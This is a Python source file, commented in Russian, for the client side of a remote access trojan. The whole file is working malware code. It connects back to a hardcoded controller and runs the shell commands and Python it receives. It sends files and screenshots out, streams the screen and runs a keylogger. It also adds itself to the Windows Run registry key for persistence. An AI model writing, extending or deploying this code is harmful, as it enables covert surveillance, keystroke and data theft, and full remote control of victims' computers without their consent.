import socket
import json
import subprocess
import os
import re # Чтобы диски определить

# Не получается получить exe файл с включнием своих скриптов  
import threading
import keylogger

# persist + рабта с каталогами
import sys
import shutil

# connection
import time

# Системная инфомрмация
import platform

# Вроде, не нужна:
#import cv2
import numpy as np
import pickle
import struct
import pyautogui
from PIL import Image

####  Constants

SERVER_IP = '192.168.1.157'#'127.0.0.1'
SERVER_PORT = 5555

QUIT = True
DISCONNECT = False
RECONNECT = 'reconnect'


####   

# Отправить ответ
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode()) # В python3 - нужен encode

"""
# Если значение принимаемых данных выйдет за пределы 1024
# То программа сломается
#   s.recv(1024)
#
#  Следующая функция решает проблему 
"""
def reliable_recv():
    data = ''
    while True:
        try:
            # Нужно декодировать в python3 (иначе будет ошибка)
            # rstrip() - чтобы не было переноса на новую строку
            #
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def exists(name):
    if (os.path.exists(name) == False):
        f = open('ERROR_DOESNT_EXIST.txt', 'a+')
        f.write('ERROR FILE or FOLDER DOESNT EXIST')
        f.close()
        f = open('ERROR_DOESNT_EXIST.txt', 'rb')
        target.send(f.read())
        f.close()
        os.remove('ERROR_DOESNT_EXIST.txt')
        return False
    return True

def upload(name):
    # Файл бинарный, поэтому нужно исп rb
    if (exists(name)):
        if (os.path.isdir(name)):
            shutil.make_archive('archive_' + name, 'zip', name)
            f = open('archive_' + name + '.zip', 'rb')
            s.send(f.read())
            f.close()
            os.remove('archive_' + name + '.zip')
        else:
            f = open(name, 'rb')
            s.send(f.read())
            f.close()

def download(object_type, name):
    # Файл бинарный, поэтому нужно исп wb 
    if (object_type == 'file'):
        f = open(name, 'wb')
    elif (object_type == 'folder'):
        f = open(name + '.zip', 'wb')
    # Чтобы обнаружить окончание загрузки файла выставляем таймаут
    # Если файл закочится, цикл завершится
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    # Выставялем timeout=None, чтобы не было проблем с другими функциями
    s.settimeout(None)
    f.close()

def screenshot():
    myscreenshot = pyautogui.screenshot()
    myscreenshot.save('screen.png')

# Вызов: persistence RDPython program.exe
def persist(reg_name, copy_name):
    # Сохранить в папку User/AppData/Romaning (Windows)
    file_location = os.environ['appdata'] + "\\" + copy_name
    try:
        if not os.path.exists(file_location):
            # Добавляем в автозагруку (через регистры)
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[-] Error Creating Persistence With The Target Machine')

def connection():
    global s
    global SERVER_IP
    global SERVER_PORT
    global QUIT
    global DISCONNECT
    global RECONNECT

    while True:
        time.sleep(5)
        try:
            # Адрес сервера к котрому подключаемся
            s.connect((SERVER_IP, SERVER_PORT))
            result = shell()
            # Если сервер отпраил команду Выход,
            # То выходим из цикла, 
            # завершая этим работу приложения
            if result == QUIT:
                # Выход из 1 го While (shell)
                s.close()
                # Выход из текущего While (connection)
                break
            # Если сервер отправил команду Disconnect,
            # То мы разрывам с ним соединение (удалив сокет)
            # При этом сразу же создаем новый, чтобы 
            # восстановить попытки соединения после разъединения
            elif result == DISCONNECT:
                s.close()
                time.sleep(20)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            elif result == RECONNECT:
                s.close()
                time.sleep(2)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            # Если много будет спать,
            # то, возможно, будет много рекурсивых вызовов
            connection()

def show_stream():
    global s
    try:
        while True:
            image = pyautogui.screenshot()
            image = image.resize((1280, 720), Image.ANTIALIAS)
            image = np.array(image)
            img = Image.frombytes('RGB', (1280, 720), image)
            data = pickle.dumps(np.array(img))
            s.sendall(struct.pack("L", len(data)) + data)
    except:
        print('Stream was closed. Reconnecting...')
        return RECONNECT

def send_dir():
    dirs = []
    files = []
    for element in os.listdir():
        if os.path.isdir(element):
            dirs.append(element)
        else:
            files.append(element)
    reliable_send(json.dumps([dirs,files]))

def shell():
    while True:
        command = reliable_recv()
        # Закрываем программу, если пришла команда quit
        if command == 'quit':
            return QUIT
        elif command == 'disconnect':
            return DISCONNECT        
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
            send_dir()           #reliable_send(",".join(os.listdir()))
        elif command[:2] == 'ls':
            send_dir()
        elif command[:12] == 'create_file ':
            f = open(command[12:], 'w+')
            f.close()
            send_dir()
        elif command[:12] == 'delete_file ':
            os.remove(command[12:])
            send_dir()
        elif command[:14] == 'create_folder ':
            os.mkdir(command[14:])
            send_dir()
        elif command[:14] == 'delete_folder ':
            #os.rmdir(command[14:])
            shutil.rmtree(command[14:], ignore_errors=False, onerror=None)
            send_dir()
        elif command[:12] == 'upload_file ':
            download('file', command[12:])
        elif command[:14] == 'upload_folder ':
            download('folder', command[14:])
        elif command[:14] == 'download_file ':
            upload(command[14:])
        elif command[:16] == 'download_folder ':
            upload(command[16:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload('screen.png')
            os.remove('screen.png')
        elif command[:13] == 'screen_stream':            
            return show_stream()
        elif command[:8] == 'rename=>':
            os.rename(command.partition(' | ')[0][8:], command.partition(' | ')[2])
            send_dir()
        elif command[:12] == 'python_exec ':
            result = exec(str(command[12:]))
            reliable_send('Success')
        elif command[:17] == 'python_exec_file ':
            result = execfile(str(command[17:]))
            reliable_send('Success execute file')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.KeyLogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+] Keylogger Started!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send('[+] Keylogger Stopped!')
        # Вызов: persistence Hacked program.exe
        elif command[:15] == 'get_system_info':
            disks = ')('.join(re.findall(r"[A-Z]+:.*$", os.popen("mountvol /").read(), re.MULTILINE))
            dirs = ','.join(platform.uname())
            reliable_send('__Диски__: (' + disks + "),__Текущий каталог__:" + os.getcwd() + ",__Система__:," + dirs)
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        else:
            try:
                execute = subprocess.Popen(command,
                                           shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                # Не работает на python 3
                # result = execute.stdout.read() + execute.stderr.read()
                # Альтернатива
                out, err = execute.communicate()
                reliable_send('Done<br>result: ' + out.decode() + '<br>errors: ' + err.decode())
            except:
                print('shell except')
                reliable_send('Ой-ой, команда (' + command + ') не была распознана shell')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()